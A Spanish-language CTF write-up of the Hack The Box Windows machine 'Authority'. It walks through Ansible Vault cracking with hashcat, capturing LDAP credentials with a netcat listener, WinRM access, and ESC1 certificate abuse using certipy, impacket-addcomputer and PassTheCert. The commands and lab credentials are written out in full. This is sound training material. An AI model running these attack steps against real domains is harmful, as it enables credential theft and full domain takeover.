---
title: Authority - Hack the Box (htb)
date: 2023-11-08 14:09:00 +0800
categories: [writeup, htb]
tags: [htb,ctf,windows, hack the box,ESC1,cracking]
math: true
mermaid: true
image:
  path: /writeup-htb-authority/htb.png
  alt: Authority
---

> Queridos lectores, es un placer darles la bienvenida a este fascinante viaje a través del mundo de HackTheBox. En esta ocasión, nos sumergiremos en los entresijos de la máquina Authority, un reto catalogado como de dificultad media y alojado en un servidor Windows. En este emocionante recorrido, vamos a descifrar los Ansible vaults, lo que nos permitirá acceder a un sitio web donde se realizará una petición out of band, para así obtener acceso al usuario. Como desafío final, debemos llevar a cabo una escalada de privilegios (privilege escalation), la cual se realizará a través de la vulnerabilidad ESC1 producida por configuraciones incorrectas en los certificate templates del Active Directory.   

## Reconocimiento
Primeramente iniciamos con el escaneo de puerto mediante la herramienta `nmap`.
```bash
sudo nmap 10.10.11.222 -Pn -p- -sS -n -T4 -oN scan1 --open -vvv
```
Como resultado se obtiene varios puertos abiertos los cuales se observan a continuación. 
```bash
Nmap scan report for 10.10.11.222
Host is up, received user-set (0.10s latency).
Scanned at 2023-11-02 12:58:54 EDT for 47s
Not shown: 64569 closed tcp ports (reset), 937 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
8443/tcp  open  https-alt        syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49688/tcp open  unknown          syn-ack ttl 127
49689/tcp open  unknown          syn-ack ttl 127
49691/tcp open  unknown          syn-ack ttl 127
49692/tcp open  unknown          syn-ack ttl 127
49701/tcp open  unknown          syn-ack ttl 127
49714/tcp open  unknown          syn-ack ttl 127
49720/tcp open  unknown          syn-ack ttl 127
57626/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
# Nmap done at Thu Nov  2 12:59:41 2023 -- 1 IP address (1 host up) scanned in 47.05 seconds
```

Para obtener mayor información de estos puertos se utilizará el siguiente comando:
```bash
nmap 10.10.11.222 -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8443,9389,47001,49664,49665,49666,49667,49674,49688,49689,49691,49692,49701,49714,49720,57626 -Pn -sV -sC -oN scan2
```
El resultado arroja bastante información, donde los puntos más relevantes son: El `AD` (active directory) está activo, `SMB` (Server Message Block Protocol) está corriendo en el puerto `445`, `WinRM` (Windows Remote Management Protocol) posiblemente se está ejecutando en el puerto `5985` y en el puerto `8443` hay una página web. Además el dominio del servidor es `authority.htb`.
```bash
Nmap scan report for 10.10.11.222
Host is up (0.10s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-11-02 21:07:47Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2023-11-02T21:08:55+00:00; +3h59m58s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2023-11-02T21:08:54+00:00; +3h59m57s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2023-11-02T21:08:55+00:00; +3h59m58s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2023-11-02T21:08:54+00:00; +3h59m57s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8443/tcp  open  ssl/https-alt
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=172.16.2.118
| Not valid before: 2023-10-31T10:45:06
|_Not valid after:  2025-11-01T22:23:30
|_http-title: Site doesn\'t have a title (text/html;charset=ISO-8859-1).
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Thu, 02 Nov 2023 21:07:53 GMT
|     Connection: close
|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET, HEAD, POST, OPTIONS
|     Content-Length: 0
|     Date: Thu, 02 Nov 2023 21:07:53 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1936
|     Date: Thu, 02 Nov 2023 21:08:00 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> Invalid character found in the HTTP protocol [RTSP&#47;1.00x0d0x0a0x0d0x0a...]</p><p><b>Description</b> The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49689/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
49714/tcp open  msrpc         Microsoft Windows RPC
49720/tcp open  msrpc         Microsoft Windows RPC
57626/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.94%T=SSL%I=7%D=11/2%Time=6543D76B%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;c
SF:harset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Thu,\x2002\x20No
SF:v\x202023\x2021:07:53\x20GMT\r\nConnection:\x20close\r\n\r\n\n\n\n\n\n<
SF:html><head><meta\x20http-equiv=\"refresh\"\x20content=\"0;URL='/pwm'\"/
SF:></head></html>")%r(HTTPOptions,7D,"HTTP/1\.1\x20200\x20\r\nAllow:\x20G
SF:ET,\x20HEAD,\x20POST,\x20OPTIONS\r\nContent-Length:\x200\r\nDate:\x20Th
SF:u,\x2002\x20Nov\x202023\x2021:07:53\x20GMT\r\nConnection:\x20close\r\n\
SF:r\n")%r(FourOhFourRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20
SF:text/html;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Thu,\
SF:x2002\x20Nov\x202023\x2021:07:53\x20GMT\r\nConnection:\x20close\r\n\r\n
SF:\n\n\n\n\n<html><head><meta\x20http-equiv=\"refresh\"\x20content=\"0;UR
SF:L='/pwm'\"/></head></html>")%r(RTSPRequest,82C,"HTTP/1\.1\x20400\x20\r\
SF:nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en\r\
SF:nContent-Length:\x201936\r\nDate:\x20Thu,\x2002\x20Nov\x202023\x2021:08
SF::00\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><html\x20la
SF:ng=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20
SF:Request</title><style\x20type=\"text/css\">body\x20{font-family:Tahoma,
SF:Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;background
SF:-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16px;}\
SF:x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:bla
SF:ck;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;}</s
SF:tyle></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20R
SF:equest</h1><hr\x20class=\"line\"\x20/><p><b>Type</b>\x20Exception\x20Re
SF:port</p><p><b>Message</b>\x20Invalid\x20character\x20found\x20in\x20the
SF:\x20HTTP\x20protocol\x20\[RTSP&#47;1\.00x0d0x0a0x0d0x0a\.\.\.\]</p><p><
SF:b>Description</b>\x20The\x20server\x20cannot\x20or\x20will\x20not\x20pr
SF:ocess\x20the\x20request\x20due\x20to\x20something\x20that\x20is\x20perc
SF:eived\x20to\x20be\x20a\x20client\x20error\x20\(e\.g\.,\x20malformed\x20
SF:request\x20syntax,\x20invalid\x20");
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-11-02T21:08:45
|_  start_date: N/A
|_clock-skew: mean: 3h59m57s, deviation: 0s, median: 3h59m57s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Nov  2 13:08:57 2023 -- 1 IP address (1 host up) scanned in 74.83 seconds
```
Vamos a comprobar si en el puerto `5985` se está ejecutando WinRM, para ello usamos el módulo `auxiliary/scanner/winrm/winrm_auth_methods` de `metasploit`. A continuación el paso a paso.
- Primero iniciamos metasploit.
```bash
msfconsole
```
- Luego usamos el módulo `auxiliary/scanner/winrm/winrm_auth_methods`.
```
use auxiliary/scanner/winrm/winrm_auth_methods 
```
- Colocamos la ip de la máquina víctima en el parámetro `rhosts`.
```
set rhosts 10.10.11.222 
```
- Por último corremos el módulo.
```
exploit 
```
El resultado indica que `WinRM` se está ejecutando en el puerto `5985`, por lo tanto, vamos a poder conectarse por este puerto al sistema; eso lo veremos más adelante.
![Desktop View](/writeup-htb-authority/winrm.png)
_WinRm_

Ahora vamos a revisar el sitio web que se encuentra en el puerto `8443`, para ello colocamos en nuestro navegador lo siguiente: `http://10.10.11.222:8443`. Al cargar la página aparece un login.
![Desktop View](/writeup-htb-authority/login.png)
_Login_
Debajo del login hay 2 opciones más, las cuales nos llevan al `/config/login`, donde hay un campo para digitar un `password`.
> Como solo se puede digitar el password, posiblemente por acá se ingresa al sistema web y para ello debemos de encontrar un password.
{: .prompt-tip }
![Desktop View](/writeup-htb-authority/config.png)
_Config_
## Enumeración
Teniendo la información de los puertos más importantes, procedemos a realizar la enumeración.  
Primeramente vamos a comenzar por el servicio de `smb`; en un servicio `smb` lo primero que se enumera son los archivos compartidos (`shares`), para ello utilizamos la herramienta `smbclient`.
> Smbclient es una herramienta de línea de comandos que se utiliza para acceder y gestionar recursos compartidos en sistemas que utilizan el protocolo SMB/CIFS (Server Message Block / Common Internet File System). Smbclient permite a los usuarios:
- Acceder a Comparticiones Compartidas
- Subir y Descargar Archivos
- Ejecutar Comandos Remotos
- Navegar por la Estructura de Directorios
- Interactuar con Impresoras Compartidas
{: .prompt-info }

Para enumerar los `shares` usamos el siguiente comando.
```bash
smbclient -L 10.10.11.222 -N
```
![Desktop View](/writeup-htb-authority/smbclient.png)
_shares_
Hay varias carpetas, por lo tanto vamos a ingresar a cada una de ellas, sin embargo, solo a `Development` se tiene acceso.
```bash
smbclient //10.10.11.222/Development -N
```
Hay un directorio llamado `Automation`, el cual contiene varios archivos.
![Desktop View](/writeup-htb-authority/development.png)
_Development_
Descargamos a nuestra máquina toda esa información, y esto lo realizaremos por medio de la consola de smbclient. Para esto digitamos lo siguiente:
```
recurse ON
prompt OFF
mget *
```
![Desktop View](/writeup-htb-authority/download smb.png)
_Download files_
Una vez descargado, comenzamos a buscar información valiosa en los archivos.  
- En la ruta `Automation/Ansible/PWM`, en el archivo `ansible.cfg`{: .filepath}, hay un nombre de usuario `svc_pwm`.  
![Desktop View](/writeup-htb-authority/ansible cfg.png)
_Ansible.cfg_
- En la ruta `Automation/Ansible/PWM/templates`, en el archivo `tomcat-users.xml.j2`{: .filepath}, hay usuarios y contraseñas. Se probaron estas credenciales, pero no se tuvo éxito.  
![Desktop View](/writeup-htb-authority/tomcat.png)
_tomcat-users.xml.j2_
- En la ruta `Automation/Ansible/PWM`, en el archivo `ansible_inventory`{: .filepath}, hay una contraseña para el usuario administrator, he índica que es para conectarse a winrm. Se probó la conexión, pero no sé conecto.
![Desktop View](/writeup-htb-authority/ansible inventory.png)
_ansible_inventory_
- En la ruta `Automation/Ansible/PWM/defaults`, en el archivo `main.yml`{: .filepath}, hay datos cifrados en ANSIBLE_VAULT.  

> Ansible Vault es una característica de Ansible que le permite cifrar datos confidenciales dentro de guías y archivos de inventario. Proporciona una capa adicional de seguridad al cifrar secretos como contraseñas, claves API o claves privadas SSH. Por lo tanto, seguramente acá están las credenciales que necesitamos.  
{: .prompt-tip }
![Desktop View](/writeup-htb-authority/ansible vault.png)
_main.yml_
## Cracking de Ansible Vault
Vamos a crackear los ansible vault y para ello nos apoyamos del siguiente artículo [**Cracking Ansible Vault Secrets with Hashcat**](https://www.bengrewell.com/cracking-ansible-vault-secrets-with-hashcat/).  
- Primeramente debemos de extraer el ansible vault blob. En el archivo hay 3 vault blob, las cuales son las de: `pwm_admin_login`, `pwm_admin_password` y `ldap_admin_password`. Escogemos cualquiera, luego creamos un archivo llamado `credentials.vault`{: .filepath} y pegamos el valor.
{: .prompt-tip }
![Desktop View](/writeup-htb-authority/credentials-vault.png)
_credential.vault_
- Ahora vamos a convertir la credencial a otro formato para que la herramienta `hashcat` pueda interpretarla; para ello usamos a `ansible2john` (Herramienta que forma parte de la suite de John the Ripper).
```bash
ansible2john credentials.vault > credentials.hash
```
 Esto da como resultado una cadena de caracteres que inicia con el nombre del archivo origen(en nuestro caso aparece `credentials.vault`), seguido de `:`y para finalizar demás caracteres del vault. Como `hashcat` no interpreta el nombre del archivo como válido, borramos el nombre `credentials.hash`{: .filepath} y también los `:` que están a continuación del nombre.
![Desktop View](/writeup-htb-authority/credential -hash.png)
_credential hash_
- Ahora usamos hashcat.
```bash
hashcat -m 16900 -O -a 0 -w 4 credentials.hash /usr/share/wordlists/rockyou.txt
```
Luego de un tiempo obtenemos como resultado `!@#$%^&*`, que vendría hacer la frase de cifrado del vault.
![Desktop View](/writeup-htb-authority/hashcat.png)
_Hashcat_

> La frase de cifrado se usa desencriptar los ansible vault, por lo tanto, con esto podemos desencriptar los ansible vault de `pwm_admin_login`, `pwm_admin_password` y `ldap_admin_password`.   
{: .prompt-info }

En la página [**Ansible Vault Tool**](https://ansible-vault.braz.dev/) se pueden desencriptar los ansible vault. Para ello debemos de colocar la frase de cifrado en `Passphrase` y en `Content to encrypt / decrypt` el ansible vault; por último click en `Decrypt`.
![Desktop View](/writeup-htb-authority/pwm_admin_login.png)
_pwm_admin_login_
![Desktop View](/writeup-htb-authority/pwm_admin_password.png)
_pwm_admin_password_
![Desktop View](/writeup-htb-authority/ldap_admin_password.png)
_ldap_admin_password_
Por lo tanto, al final se obtiene el siguiente resultado:
- El valor del vault de pwm_admin_login es **svc_pwm**
- El valor del vault de pwm_admin_password es **pWm_@dm!N_!23**
- El valor del vault de ldap_admin_password es **DevT3st@123**


## Explotación
Teniendo toda está información vamos a intentar ingresar al sistema, para ello primero vamos a probar en la página web del puerto `8443`.  En el login inicial se colocó el usuario `svc_pwm` y el password `pWm_@dm!N_!23`; dando como resultado un error, donde se indica que el directorio está inhabilitado, por lo tanto, no es posible ingresar por acá.
![Desktop View](/writeup-htb-authority/login2.png)
_Login_
![Desktop View](/writeup-htb-authority/error.png)
_Error_
Sin embargo, en la página `Configuration Manager` hay un campo para ingresar password. Colocamos el valor de `pWm_@dm!N_!23`.
![Desktop View](/writeup-htb-authority/configuration manager.png)
_Configuration manager_
Y bingo, conseguimos loguearse.  
![Desktop View](/writeup-htb-authority/login correcto.png)
_Configuration manager_
Comenzamos a ver cada una de las opciones de la página en busca de algo que nos ayude a ingresar al sistema.  
Encontramos la opción configuration editor, la cual nos lleva a otra página donde se puede manipular las configuraciones.  
![Desktop View](/writeup-htb-authority/config editor.png)
_Configuration editor_
Visualizamos cada una de las opciones y  cuando desplegamos `LDAP`, `LDAP directories`, `defualt` y `conecction`, encontramos algo muy interesante. 
> Se puede agregar una conexión de LDAP y luego testear, por lo tanto, podemos indicarle que apunte a un puerto de nuestra máquina y ver los datos que envían. Según las opciones que se logran observar lo que enviará será el `LDAP Proxy User`y el `LDAP Proxy Password`.
{: .prompt-tip }
- Agregamos la ldap url, donde colocamos `ldap://nuestraIp:nuestroPuerto`.
![Desktop View](/writeup-htb-authority/ldap.png)
_Ldap url_
- Luego en una shell colocamos nuestro puerto en escucha.
```bash
nc -lvnp 3222 
```
- Por último damos click en `Test LDAP profile`.
![Desktop View](/writeup-htb-authority/test ldap.png)
_Test LDAP profile_
Al shell llegaron los datos del `LDAP Proxy User`y el `LDAP Proxy Password`. En donde vemos que el usuario es `svc_ldap` y el password `lDaP_1n_th3_cle4r!`.
![Desktop View](/writeup-htb-authority/shell.png)
_nc_


### Ingreso al sistema para obtener el flag del usuario
El usuario encontrado debe de tener estar registrado en el servidor Windows, por lo tanto, vamos a conectarse por medio de `WinRM`, para ello utilizamos la herramienta `evil-winrm`.
>Evil-WinRM es una herramienta de prueba de penetración que se utiliza para obtener acceso remoto no autorizado a sistemas Windows a través del protocolo WinRM (Windows Remote Management). WinRM es el protocolo de administración remota en Windows que permite a los administradores controlar las máquinas de forma remota utilizando el Protocolo de Transferencia de Estado Representacional (REST) sobre HTTP.
{: .prompt-info }

Colocamos el siguiente conectador para conectarse al servidor.
```bash
evil-winrm -i 10.10.11.222 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' 
```
Se ingresó con éxito al servidor.
![Desktop View](/writeup-htb-authority/winrm login.png)
_Ingreso al sistema_

Ahora nos dirigimos al escritorio donde se encuentra el flag del usuario.
![Desktop View](/writeup-htb-authority/user flag.png)
_Flag del usuario_

## Escalada de privilegios (Privilege escalation)
Como desafío final debemos de escalar privilegios para obtener los permisos de administrador y así lograr ver el último flag.
### Identificación de vulnerabilidades.
Como él active directory está activo, lo que vamos a hacer es utilizar la herramienta `certipy` para identificar vulnerabilidades.
> Certipy es una herramienta que permite descubrir vulnerabilidades del Active Directory Certificate Services (AD CS) y abusar de estas. En kali esta herramienta tiene el nombre de `certipy-ad`.
{: .prompt-info }
Vamos a descubrir si él active directory tiene vulnerabilidades en los certificate services, para ello utilizamos la opción `find` de la herramienta.
```bash
certipy-ad find -dc-ip 10.10.11.222 -u svc_ldap -p lDaP_1n_th3_cle4r! -enabled -vulnerable -stdout
```
> Donde:   
	 -dc-ip -> específica la ip de la máquina victima.  
	 -u -> específica el usuario.  
	 -p -> específica el password.  
	 -enabled -> indica que solo se vean los certificate templates habilitados.  
	 -vulnerable -> indica que solo se vean los certificate templates vulnerables.  
	 -stdout -> muestra el resultado como texto.  
{: .prompt-info }
El resultado es un certificado vulnerable a `ESC1`.  
Los datos más importantes a tener en cuenta son: el nombre del template vulnerables es `CorpVPN`, el Certificate Authorities(CA) es `AUTHORITY-CA` y los que pueden pedir este certificado son los usuarios que pertenezcan a `AUTHORITY.HTB\Domain Computers`, es decir las computadoras.  
```bash
certipy-ad find -dc-ip 10.10.11.222 -u svc_ldap -p lDaP_1n_th3_cle4r! -enabled -vulnerable -stdout
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Trying to get CA configuration for 'AUTHORITY-CA' via CSRA
[!] Got error while trying to get CA configuration for 'AUTHORITY-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'AUTHORITY-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'AUTHORITY-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : AUTHORITY-CA
    DNS Name                            : authority.authority.htb
    Certificate Subject                 : CN=AUTHORITY-CA, DC=authority, DC=htb
    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
    Certificate Validity End            : 2123-04-24 01:56:25+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : AUTHORITY.HTB\Administrators
      Access Rights
        ManageCa                        : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        ManageCertificates              : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Enroll                          : AUTHORITY.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollmentCheckUserDsCertificate
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : AUTHORITY.HTB\Administrator
        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Property Principals       : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
    [!] Vulnerabilities
      ESC1                              : 'AUTHORITY.HTB\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
```

> Un certificate template con la vulnerabilidad ESC1 permite a los usuarios con pocos privilegios inscribirse y solicitar un certificado en nombre de cualquier objeto de dominio especificado por el usuario. Esto significa que cualquier usuario con derechos de inscripción puede solicitar un certificado para una cuenta privilegiada, como la de administrador de dominio.
{: .prompt-info }
### Explotación de la vulnerabilidad ESC1
En el artículo [**Abusing Active Directory Certificate Services**](https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/), nos enseñan como explotar la vulnerabilidad ESC1.  
> Antes de hacer lo que indican en el artículo necesitamos un `usuario` y `password` que estén asociados al template vulnerable, como `AUTHORITY.HTB\Domain Computers` está presente en el template, entonces, todas las computadoras pertenecen al template. Por lo tanto, si agregamos una nueva computadora al dominio podremos explotar la vulnerabilidad. 
{: .prompt-tip } 
Para realizar esta acción vamos a utilizar la herramienta `impacket-addcomputer` que permite agregar una computadora.
```bash
impacket-addcomputer authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!' -dc-ip 10.10.11.222 -computer-name test$ -computer-pass Test123456
```
> Donde:  
	 authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!' -> tiene la estructura de dominio/usuario:\'password \'.  
	 -computer-name -> específica el nombre de la computadora; siempre debe ir $ después del nombre.  
	 -computer-pass -> específica el password de la computadora.  
{: .prompt-info }
La computadora se creó correctamente. 
![Desktop View](/writeup-htb-authority/add computer.png)
_Add computer_
Con los datos de esta máquina ya podemos explotar la vulnerabilidad ESC1. De acuerdo al artículo se debe de utilizar la opción `req` de certipy.
```bash
certipy-ad req -u 'test$@authority.htb' -p 'Test123456' -ca 'AUTHORITY-CA' -target 10.10.11.222 -template 'CorpVPN' -upn 'administrator@authority.htb' -debug
```
> Donde:  
	 -target -> específica ip de la máquina victima.  
	 -ca -> específica Certificate Authorities(CA).  
	 -u -> específica el usuario seguido de @ y luego el dominio (el usuario es el nombre de la computadora creada).  
	 -p -> específica el password (el password es de la computadora creada) .  
	 -template -> específica el certificate templates vulnerable.  
	 -upn -> específica el usuario objetivo del cual queremos obtener sus permisos.  
	 -debug -> muestra todo el proceso realizado.  
{: .prompt-info }

Se ejecutó correctamente y se obtuvo como resultado el archivo `administrator.pfx`.
![Desktop View](/writeup-htb-authority/certipy req.png)
_Certipy req_
Con este archivo podemos intentar conectarse al sistema. Para esto usamos la opción `auth` de certipy.
```bash
 certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.222 -u administrator
```
> Donde:  
	 -pfx -> específica el archivo pfx.  
	 -u -> específica el usuario.  
{: .prompt-info }
Ejecutamos y sale el error: `Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)`.
![Desktop View](/writeup-htb-authority/certipy auth.png)
_Certipy auth_
Se buscó este error y en el artículo [**Authenticating with certificates when PKINIT is not supported**](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html), indican que sale esto porque la autenticación por kerberos no está permitida, sin embargo, hay otro método para autenticarse cuando está opción está deshabilitada y es por medio de `certificados de cliente`; para ello se puede usar la herramienta `PassTheCert` que está diseñada para este fin.
### Uso de PassTheCert para escalar privilegios.
Para esto primero tenemos que generar los certificados del cliente, en el github de la herramienta [**PassTheCert**](https://github.com/AlmondOffSec/PassTheCert/tree/main/Python), nos indican que se pueden hacer por medio de `certipy`, en la cual se utilizará el certificado `administrator.pfx` obtenido anteriormente.  
- Primero obtenemos el `certificado del cliente`.
```bash
certipy-ad cert -pfx administrator.pfx -nokey -out user.crt
```
- Luego obtenemos la `key del cliente`.
```bash
certipy-ad cert -pfx administrator.pfx -nocert -out user.key
```
![Desktop View](/writeup-htb-authority/certificados de cliente.png)
_Certificados del cliente_
  
Ahora usamos la herramienta `PassTheCert`. Nota: La herramienta lo descargamos desde su github [**PassTheCert**](https://github.com/AlmondOffSec/PassTheCert/tree/main/Python).
```bash
python3 passTheCert.py -action ldap-shell -dc-ip 10.10.11.222 -crt user.crt -key user.key -domain authority.htb
```
> Donde:  
	 -action ldap-shell -> indica que queremos obtener una ldap-shell.  
	 -crt -> específica el certificado del usuario.  
	 -key -> específica el key del usuario.  
{: .prompt-info }
Ejecutamos y obtenemos una ldap-shell.
![Desktop View](/writeup-htb-authority/passthecert.png)
_PassTheCert_
Hay diferentes opciones que se puede realizar en la shell, como nosotros queremos escalar privilegios, lo que vamos a hacer es `cambiar el password del usuario administrator`. Otra manera seria añadiendo el usuario svc_ldap al grupo de administradores.  
